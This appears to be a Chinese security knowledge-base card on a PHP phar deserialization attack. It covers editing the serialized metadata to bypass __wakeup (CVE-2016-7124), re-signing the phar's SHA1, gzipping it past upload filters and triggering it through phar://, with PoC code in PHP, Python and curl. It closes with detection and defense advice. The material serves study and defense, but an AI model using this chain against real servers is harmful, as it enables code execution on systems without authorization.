---
id: web-php-deserialization-phar-edit-metadata-resign-sha1
title: 修改 Phar 序列化元数据后重算 SHA1 签名：属性数绕 __wakeup 再 gzip 上传过正则
type: scenario
domain: web
path: web/php/deserialization
technique: phar-edit-metadata-resign-sha1-wakeup-bypass
aliases:
- Phar 重算签名
- phar SHA1 签名
- phar 修改 metadata
- phar 属性数绕 wakeup
- phar gzip 过正则
- GBMB
tags:
- php
- phar
- deserialization
- signature
- sha1
- wakeup
- gzip
- bypass
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V413
  verified_at: '2026-11-09T15:19:38+08:00'
  notes: '已对照原文与图片核对：生成 GIF89a stub phar、setMetadata、改序列化属性数绕 __wakeup、gzip 过明文正则、上传 jpg 后 phar:// 触发，均与原文一致；重签名公式 body=f[:-28]、sha1(body)+f[-8:]（20B SHA1+4B 类型+GBMB）技术正确，PoC 中 O:4:"File":3: 的索引偏移算术核对无误；PHP/5.3.38 在 CVE-2016-7124 受影响范围。该卡为 --force 卡：与既有 phar-upload-jpg-wakeup-eval（反序列化链）、compressed-phar-include-bypass（gzip 过检测）、wakeup-property-count-bypass（属性数）相比，新增且未覆盖的是修改后重算 SHA1 签名这一必要步骤，区分理由成立。未验证点：未在本机生成/重签名/上传复跑；affected_versions 已 --clear（5.3.38 为靶机版本）。'
---

## 一句话结论

生成含恶意 metadata 的 phar 后，如果要改动其中的序列化串（例如把属性数加 1 以跳过 `__wakeup`），必须同步重算 phar 签名：文件末尾固定是 `SHA1(data)` 20 字节 + 4 字节签名类型 + `GBMB` 魔数，取 `body = f[:-28]` 后写回 `body + sha1(body).digest() + f[-8:]` 即可；重签名后再 gzip 压缩去掉明文特征，改后缀上传并通过 `phar://` 触发反序列化。

## 原理

- **Phar 的签名结构**：phar 容器由 stub、manifest（含 metadata 序列化数据）、文件内容和签名组成。PHP 打开 phar 时会校验签名，默认签名类型为 SHA1：签名块位于文件末尾，结构为
  `[20 字节 SHA1(data)] [4 字节签名类型] ["GBMB"]`，
  其中 `data` 是签名块之前的全部字节。任何对 stub/metadata 的修改都会让签名不匹配，phar 解析失败。
- **为什么要改 metadata**：如果目标类的 `__wakeup()` 会重置危险属性，可利用 PHP 5.x 的属性数绕过（CVE-2016-7124）：把序列化串 `O:4:"File":3:{...}` 的声明属性数改成比实际更大的值（如 `:4:`），`unserialize()` 不调用 `__wakeup`，攻击者设置的属性得以保留，随后由 `__destruct` 等触发 sink。改动数字不改变长度，便于在原位置直接替换。
- **为什么必须重签名**：PHP 校验签名后才会反序列化 metadata；不重算 SHA1 时会报 “broken signature/phar corrupt”，整个链到不了 gadget。重算时保留原签名类型和 `GBMB` 魔数即可。
- **为什么要 gzip**：上传点若用正则检查明文特征（如 `<?php`、`__HALT_COMPILER`、`GIF89a` 等），gzip 压缩后的字节流不再包含这些明文；PHP 的 `phar://` 包装器会自动识别并解压 gzip/bzip2 容器，仍按 phar 解析。
- **触发方式**：上传为 jpg/png 等任意后缀，在文件操作（`file_get_contents`/`include`/`getimagesize` 等）中把路径拼成 `phar://<上传路径>`，PHP 解析 phar 并反序列化 metadata，触发 gadget。
- **版本条件**：属性数绕过依赖 PHP 5.5 及更早 / 5.6.0–5.6.25 / 7.0.0–7.0.10（CVE-2016-7124）；本例目标 `X-Powered-By` 为 PHP/5.3.38，仍在受影响范围。PHP 8.0+ 起 `phar://` 不再自动反序列化 metadata，需依赖显式 `unserialize()`。

## 触发条件

- 能生成或构造 phar（本地 `phar.readonly=Off`，或手工拼字节）。
- 上传/写文件点接受 gzip 压缩内容并允许任意后缀（或能做后缀绕过）。
- 存在用 `phar://` 打开用户可控路径、或对用户可控文件内容执行 `unserialize()` 的功能。
- 目标 PHP 版本存在属性数 `__wakeup` 绕过（或 metadata 里的 gadget 不需要绕过 wakeup）。
- 已知 phar 签名类型（默认 SHA1；若为 MD5/SHA-256，摘要长度与重算方式不同）。

## 利用步骤

1. 在本地生成 phar：设置 GIF89a 等 stub、`setMetadata($gadget)`、添加任意文件并 `stopBuffering()`。
2. 用十六进制编辑器/Python 找到序列化 metadata 中的 `O:<len>:"<Class>":<N>:`，把 `N` 改成 `N+1`（保持数字位数不变）。
3. 重算签名：
   ```python
   from hashlib import sha1
   f = open('exp.phar', 'rb').read()
   body = f[:-28]                 # 去掉 20 字节 SHA1 + 4 字节类型 + GBMB
   tail = f[-8:]                  # 原签名类型 + GBMB
   open('exp_resigned.phar', 'wb').write(body + sha1(body).digest() + tail)
   ```
4. `gzip exp_resigned.phar`（或 bzip2），得到 `exp_resigned.phar.gz`；确认字节流中不含被过滤的明文关键字。
5. 改后缀为 `.jpg`/`.png` 上传，拿到可访问路径。
6. 访问/触发使用 `phar://` 的功能（如 `download.php?file=phar:///var/www/html/upload/xxx.jpg`），观察 gadget 执行结果。

## PoC

```php
<?php
// 本地生成（phar.readonly=Off）；gadget 类按目标源码定义
$phar = new Phar('exp.phar', 0, 'exp.phar');
$phar->startBuffering();
$phar->setStub("GIF89a" . "<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($gadget);          // 序列化后的对象
$phar->addFromString('test.txt', 'test');
$phar->stopBuffering();
```

```python
# 修改 metadata 属性数后重算 SHA1 签名（在 Python 中完成字节替换）
from hashlib import sha1

data = bytearray(open('exp.phar', 'rb').read())
i = data.index(b'O:4:"File":3:')      # 以目标类实际序列化串为准
data[i + len(b'O:4:"File":')] = ord('4')  # 3 -> 4，长度不变
data = bytes(data)
body, tail = data[:-28], data[-8:]
open('exp_resigned.phar', 'wb').write(body + sha1(body).digest() + tail)
```

```bash
gzip -c exp_resigned.phar > exp_resigned.phar.gz
# 上传后触发
curl 'http://target/download.php?file=phar:///var/www/html/upload/exp_resigned.phar.gz'
```

说明：结构与重签名步骤按原文流程整理；`File` 类名、属性数与 upload 路径需按目标替换。未在本机复跑。

## 变体与关联

- **签名类型**：若 phar 使用 MD5（16 字节）或 SHA-256（32 字节），签名的摘要长度与 `f[:-28]` 切片要相应调整；保留末尾的 4 字节类型和 GBMB。
- **压缩绕过**：gzip/bzip2 均可；PHP 的 `phar://` 会自动解压，见 [[web-php-deserialization-compressed-phar-include-bypass]]。
- **属性数绕过细节**：见 [[web-php-deserialization-wakeup-property-count-bypass]]；PHP 8+ 上 metadata 不再自动反序列化，可改用显式 `unserialize()` 或其它入口。
- **Phar 触发面**：`file_get_contents`、`include`、`getimagesize`、`ZipArchive::extractTo`、`PDO pgsqlCopyFromFile` 等最终走 `php_stream_open_wrapper` 的函数都可能触发，见 [[web-php-deserialization-phar-sourcechain-zip-pgsql-sinks]]。
- **关联**：任意后缀上传 + metadata 反序列化的完整链见 [[web-php-deserialization-phar-upload-jpg-wakeup-eval]]。
- **边界**：签名类型未知且无法识别、上传点禁止 gzip/压缩内容、目标 PHP 已修复属性数绕过或不再自动反序列化 metadata 时，本链不成立。

## 检测与防御

- **代码**：不要对用户可控路径使用 `phar://` 或对用户内容 `unserialize()`；如必须使用，启用 `allowed_classes` 白名单并校验 phar 签名来源。
- **上传**：解压后检查内容，不只做明文正则；禁止上传可被 `phar://` 解析的容器（或重命名/剥离元数据）；限制上传目录的脚本执行。
- **PHP 版本**：升级到修复 CVE-2016-7124 的版本；PHP 8.0+ 虽不再自动反序列化 metadata，但仍应避免用户可控 `unserialize()`。
- **检测**：上传文件中出现 `GBMB`、`__HALT_COMPILER`、gzip 魔数 `1f 8b` 与 PHP 代码混合；`phar://` 路径访问日志；反序列化 gadget 类被实例化、`__wakeup`/`__destruct` 触发文件/命令操作。
